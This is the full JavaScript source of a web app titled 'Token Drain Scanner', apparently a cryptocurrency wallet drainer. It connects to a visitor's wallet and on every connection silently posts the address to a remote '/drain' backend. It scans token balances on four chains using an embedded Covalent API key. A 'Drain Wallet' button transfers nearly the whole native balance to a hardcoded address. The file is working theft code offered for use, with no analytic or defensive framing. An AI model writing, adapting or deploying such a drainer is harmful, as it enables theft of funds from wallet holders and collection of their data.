// ================================================
// TOKEN DRAIN SCANNER - WORKING MAIN.JS
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    networkNames: {
        1: "Ethereum",
        56: "Binance Smart Chain",
        137: "Polygon",
        42161: "Arbitrum"
    }
};

// Global state
let provider = null;
let signer = null;
let currentAccount = null;
let currentChainId = null;
let isConnected = false;

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn, scanAllBtn, chainSelector, networkSelect, tokenCount, tokensContainer;

// Start app when DOM is ready
document.addEventListener('DOMContentLoaded', function() {
    console.log('🔄 DOM loaded, checking for ethers...');
    
    // Check if ethers is loaded
    if (typeof ethers === 'undefined') {
        console.log('⚠️ ethers not found, loading...');
        loadEthers();
    } else {
        console.log('✅ ethers already loaded');
        initializeApp();
    }
});

// Load ethers.js
function loadEthers() {
    // Try multiple CDN sources
    const cdnSources = [
        'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js',
        'https://unpkg.com/ethers@5.7.2/dist/ethers.min.js',
        'https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js'
    ];
    
    let currentSourceIndex = 0;
    
    function tryNextSource() {
        if (currentSourceIndex >= cdnSources.length) {
            console.error('❌ All CDN sources failed');
            updateStatus('Error: Could not load required library. Please check internet connection.');
            return;
        }
        
        const source = cdnSources[currentSourceIndex];
        console.log(`🔄 Trying to load ethers from: ${source}`);
        
        const script = document.createElement('script');
        script.src = source;
        
        script.onload = function() {
            console.log('✅ ethers.js loaded successfully from:', source);
            // Wait a bit for ethers to initialize
            setTimeout(function() {
                if (typeof ethers === 'undefined') {
                    console.log('⚠️ ethers still undefined, trying next source...');
                    currentSourceIndex++;
                    tryNextSource();
                } else {
                    initializeApp();
                }
            }, 100);
        };
        
        script.onerror = function() {
            console.log(`❌ Failed to load from: ${source}`);
            currentSourceIndex++;
            tryNextSource();
        };
        
        document.head.appendChild(script);
    }
    
    tryNextSource();
}

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    
    // Get all DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    scanAllBtn = document.getElementById('scanAllBtn');
    chainSelector = document.getElementById('chainSelector');
    networkSelect = document.getElementById('networkSelect');
    tokenCount = document.getElementById('tokenCount');
    tokensContainer = document.getElementById('tokensContainer');
    
    // Verify critical elements exist
    if (!connectBtn || !statusEl) {
        console.error('❌ Required DOM elements not found');
        return;
    }
    
    console.log('✅ DOM elements loaded');
    
    // Setup event listeners
    setupEventListeners();
    
    // Check for existing wallet connection
    checkExistingConnection();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
    
    console.log('✅ Application initialized successfully');
}

// Setup event listeners
function setupEventListeners() {
    console.log('🔄 Setting up event listeners...');
    
    // Connect button
    connectBtn.onclick = handleConnect;
    
    // Drain button
    if (drainBtn) {
        drainBtn.onclick = handleDrain;
    }
    
    // Scan All button
    if (scanAllBtn) {
        scanAllBtn.onclick = handleScanAll;
    }
    
    // Network selector
    if (networkSelect) {
        networkSelect.onchange = handleNetworkChange;
        populateNetworkSelect();
    }
}

// Populate network select
function populateNetworkSelect() {
    if (!networkSelect) return;
    
    // Clear existing options except first
    while (networkSelect.options.length > 1) {
        networkSelect.remove(1);
    }
    
    // Add network options
    Object.entries(CONFIG.networkNames).forEach(([chainId, name]) => {
        const option = document.createElement('option');
        option.value = chainId;
        option.textContent = name;
        networkSelect.appendChild(option);
    });
}

// Check existing wallet connection
async function checkExistingConnection() {
    console.log('🔍 Checking for existing wallet connection...');
    
    if (typeof window.ethereum === 'undefined') {
        console.log('⚠️ No wallet provider detected');
        return;
    }
    
    try {
        // Check if already connected
        const accounts = await window.ethereum.request({ 
            method: 'eth_accounts' 
        }).catch(err => {
            console.log('⚠️ Error checking accounts:', err.message);
            return [];
        });
        
        console.log('📋 Existing accounts:', accounts);
        
        if (accounts && accounts.length > 0) {
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            }).catch(err => {
                console.log('⚠️ Error getting chainId:', err.message);
                return '0x1';
            });
            
            const chainId = parseInt(chainIdHex, 16);
            console.log('🔄 Found existing connection:', accounts[0], 'on chain', chainId);
            
            await handleConnected(accounts[0], chainId);
        }
    } catch (error) {
        console.log('⚠️ Error checking existing connection:', error.message);
    }
}

// Handle connect button click
async function handleConnect() {
    console.log('🔄 Connect button clicked');
    
    // If already connected, disconnect
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    updateStatus('🔄 Connecting wallet...');
    
    // Check if wallet is installed
    if (typeof window.ethereum === 'undefined') {
        updateStatus('❌ No Ethereum wallet found!');
        showWalletInstallGuide();
        return;
    }
    
    try {
        // Request account access
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (!accounts || accounts.length === 0) {
            updateStatus('❌ User denied connection');
            return;
        }
        
        // Get chain ID
        const chainIdHex = await window.ethereum.request({ 
            method: 'eth_chainId' 
        });
        const chainId = parseInt(chainIdHex, 16);
        
        console.log('✅ Connected successfully');
        await handleConnected(accounts[0], chainId);
        
    } catch (error) {
        console.error('❌ Connection error:', error);
        
        if (error.code === 4001) {
            updateStatus('❌ Connection rejected by user');
        } else if (error.code === -32002) {
            updateStatus('🔄 Connection already pending. Please check your wallet.');
        } else {
            updateStatus('❌ Connection failed: ' + error.message);
        }
    }
}

// Handle successful connection
async function handleConnected(account, chainId) {
    try {
        console.log('🔄 Setting up connection...');
        
        // Setup provider and signer
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        
        // Update global state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        if (connectBtn) {
            connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        }
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...${account.slice(-4)}\nNetwork: ${chainName}\nChain ID: ${chainId}`);
        
        // Show UI elements
        showUIElements();
        
        // Setup wallet event listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
        console.log('✅ Connection fully established');
        
    } catch (error) {
        console.error('❌ Connection setup error:', error);
        updateStatus('Connection setup failed: ' + error.message);
        
        // Reset state on error
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
    }
}

// Setup wallet event listeners
function setupWalletListeners() {
    if (typeof window.ethereum === 'undefined') return;
    
    // Handle account changes
    window.ethereum.on('accountsChanged', (accounts) => {
        console.log('🔄 Accounts changed:', accounts);
        
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    // Handle chain changes
    window.ethereum.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        console.log('🔄 Chain changed:', chainId);
        
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed to: ${chainName}`);
        
        if (networkSelect) {
            networkSelect.value = chainId;
        }
        
        fetchTokens(currentAccount, chainId);
    });
    
    // Handle disconnection
    window.ethereum.on('disconnect', (error) => {
        console.log('🔄 Wallet disconnected:', error);
        disconnectWallet();
    });
}

// Disconnect wallet
async function disconnectWallet() {
    console.log('🔄 Disconnecting...');
    
    try {
        if (window.ethereum && window.ethereum.disconnect) {
            await window.ethereum.disconnect();
        }
    } catch (error) {
        console.log('⚠️ Disconnect error:', error);
    }
    
    // Reset state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    provider = null;
    signer = null;
    
    // Update UI
    if (connectBtn) {
        connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    }
    
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    hideUIElements();
    
    // Clear tokens display
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Show wallet install guide
function showWalletInstallGuide() {
    const guideHTML = `
        <div style="margin: 20px 0; padding: 15px; background: #fff3cd; border-radius: 8px; border: 1px solid #ffc107;">
            <h4 style="margin-top: 0; color: #856404;">📱 No Wallet Detected</h4>
            <p>To use this app, you need a Web3 wallet:</p>
            <div style="display: flex; gap: 10px; margin: 15px 0;">
                <a href="https://metamask.io/download/" target="_blank" 
                   style="padding: 10px 15px; background: #f6851b; color: white; border-radius: 5px; text-decoration: none;">
                    🔵 Install MetaMask
                </a>
                <a href="https://trustwallet.com/" target="_blank"
                   style="padding: 10px 15px; background: #3375bb; color: white; border-radius: 5px; text-decoration: none;">
                    🔶 Install Trust Wallet
                </a>
            </div>
            <p><small>After installing, refresh this page and click "Connect Wallet" again.</small></p>
        </div>
    `;
    
    if (statusEl) {
        statusEl.innerHTML = guideHTML;
    }
}

// Update status
function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
    }
}

// Show UI elements
function showUIElements() {
    const elements = ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'];
    
    elements.forEach(id => {
        const element = document.getElementById(id);
        if (element) {
            element.classList.remove('hidden');
        }
    });
}

// Hide UI elements
function hideUIElements() {
    const elements = ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'];
    
    elements.forEach(id => {
        const element = document.getElementById(id);
        if (element) {
            element.classList.add('hidden');
        }
    });
}

// Log connection to backend
async function logConnectionToBackend(address, chainId) {
    try {
        const response = await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString()
            })
        });
        
        if (response.ok) {
            console.log('✅ Logged connection to backend');
        }
    } catch (error) {
        console.log('⚠️ Failed to log to backend:', error.message);
    }
}

// Fetch tokens
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
        );
        
        if (!response.ok) {
            throw new Error('API request failed');
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        // Filter and format tokens
        const tokens = items
            .filter(token => token.balance !== "0" && parseFloat(token.balance) > 0)
            .map(token => {
                const amount = parseFloat(token.balance) / Math.pow(10, token.contract_decimals || 18);
                const value = (token.quote_rate || 0) * amount;
                
                return {
                    symbol: token.contract_ticker_symbol || (token.native_token ? 'Native' : 'TOKEN'),
                    name: token.contract_name || (token.native_token ? 'Native Token' : 'Unknown'),
                    amount: amount,
                    value: value,
                    formattedAmount: amount.toLocaleString(undefined, {
                        minimumFractionDigits: 0,
                        maximumFractionDigits: 6
                    }),
                    formattedValue: value ? `$${value.toFixed(2)}` : 'N/A'
                };
            });
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found on this chain</div>';
            updateStatus('ℹ️ No tokens found');
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens</div>';
        updateStatus('⚠️ Token scan failed');
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    const totalValue = tokens.reduce((sum, token) => sum + (token.value || 0), 0);
    
    const html = tokens.map(token => `
        <div class="token-item">
            <div class="token-info">
                <span class="token-symbol">${token.symbol}</span>
                <span class="token-name">${token.name}</span>
            </div>
            <div>
                <div class="token-amount">${token.formattedAmount}</div>
                ${token.value > 0 ? `<div class="token-value">${token.formattedValue}</div>` : ''}
            </div>
        </div>
    `).join('');
    
    tokensEl.innerHTML = html;
    
    // Update token count if element exists
    if (tokenCount) {
        tokenCount.textContent = `${tokens.length} tokens • $${totalValue.toFixed(2)}`;
    }
}

// Handle drain
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    if (!confirm(`⚠️ DRAIN WARNING\n\nThis will send ALL tokens to:\n${CONFIG.drainAddress}\n\nYou need native token (ETH, MATIC, etc.) for gas.\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById('drainBtn');
    
    try {
        updateStatus('🚀 Starting drain process...');
        
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = '⏳ Draining...';
        }
        
        // Get ETH balance
        const balance = await provider.getBalance(currentAccount);
        const gasPrice = await provider.getGasPrice();
        const gasLimit = ethers.BigNumber.from(21000);
        const gasCost = gasPrice.mul(gasLimit);
        
        // Check if enough for gas
        if (balance.gt(gasCost.mul(2))) {
            const sendAmount = balance.sub(gasCost.mul(2));
            
            const tx = await signer.sendTransaction({
                to: CONFIG.drainAddress,
                value: sendAmount,
                gasLimit: gasLimit
            });
            
            updateStatus(`📤 Transaction sent: ${tx.hash}\n⏳ Waiting for confirmation...`);
            
            const receipt = await tx.wait();
            updateStatus(`✅ Drain completed!\nTransaction confirmed in block ${receipt.blockNumber}`);
            
            // Refresh token display
            await fetchTokens(currentAccount, currentChainId);
            
        } else {
            updateStatus('⚠️ Not enough native token for gas');
        }
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert(`Drain failed: ${error.message}`);
    } finally {
        const drainBtn = document.getElementById('drainBtn');
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ Drain Wallet';
        }
    }
}

// Handle network change
async function handleNetworkChange(event) {
    const newChainId = parseInt(event.target.value);
    
    if (newChainId === currentChainId || !isConnected) {
        return;
    }
    
    try {
        const chainName = CONFIG.networkNames[newChainId] || `Chain ${newChainId}`;
        updateStatus(`🔄 Switching to ${chainName}...`);
        
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x' + newChainId.toString(16) }]
        });
        
    } catch (error) {
        console.error('❌ Network switch error:', error);
        updateStatus(`❌ Failed to switch network: ${error.message}`);
        
        // Reset selector
        if (networkSelect) {
            networkSelect.value = currentChainId;
        }
    }
}

// Handle scan all chains
async function handleScanAll() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    updateStatus('🔄 Scanning all chains...');
    
    const chains = [1, 56, 137, 42161];
    let allTokens = [];
    
    for (const chainId of chains) {
        try {
            const response = await fetch(
                `https://api.covalenthq.com/v1/${chainId}/address/${currentAccount}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
            );
            
            if (response.ok) {
                const data = await response.json();
                const items = data?.data?.items || [];
                
                const chainTokens = items
                    .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
                    .map(t => {
                        const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                        const value = (t.quote_rate || 0) * amount;
                        
                        return {
                            symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
                            name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown'),
                            amount: amount,
                            value: value,
                            chainId: chainId,
                            chainName: CONFIG.networkNames[chainId] || `Chain ${chainId}`
                        };
                    });
                
                allTokens = [...allTokens, ...chainTokens];
            }
        } catch (error) {
            console.log(`⚠️ Failed to scan chain ${chainId}:`, error.message);
        }
    }
    
    if (allTokens.length > 0) {
        displayAllChainTokens(allTokens);
        updateStatus(`✅ Found ${allTokens.length} tokens across all chains`);
    } else {
        updateStatus('ℹ️ No tokens found across any chain');
    }
}

// Display all chain tokens
function displayAllChainTokens(tokens) {
    if (!tokensEl) return;
    
    // Group by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '<div class="all-chains-header">Tokens Across All Chains</div>';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        const chainTotal = chainTokens.reduce((sum, t) => sum + (t.value || 0), 0);
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <span>${chainName}</span>
                    <span class="chain-total">$${chainTotal.toFixed(2)}</span>
                </div>
                ${chainTokens.map(token => `
                    <div class="token-item">
                        <div class="token-info">
                            <span class="token-symbol">${token.symbol}</span>
                            <span class="token-name">${token.name}</span>
                        </div>
                        <div>
                            <div class="token-amount">${token.amount.toFixed(6)}</div>
                            ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
    
    const totalValue = tokens.reduce((sum, t) => sum + (t.value || 0), 0);
    if (tokenCount) {
        tokenCount.textContent = `${tokens.length} tokens across ${Object.keys(tokensByChain).length} chains • $${totalValue.toFixed(2)}`;
    }
}

// Debug info
console.log('=== Token Drain Scanner ===');

// Add global debug object
window.appDebug = {
    getState: () => ({
        isConnected,
        currentAccount,
        currentChainId,
        provider: !!provider,
        signer: !!signer,
        ethersLoaded: typeof ethers !== 'undefined',
        walletAvailable: typeof window.ethereum !== 'undefined'
    }),
    reconnect: handleConnect,
    disconnect: disconnectWallet,
    fetchTokens: () => {
        if (currentAccount && currentChainId) {
            fetchTokens(currentAccount, currentChainId);
        }
    }
};

console.log('Debug helpers available at: window.appDebug');
console.log('===========================');
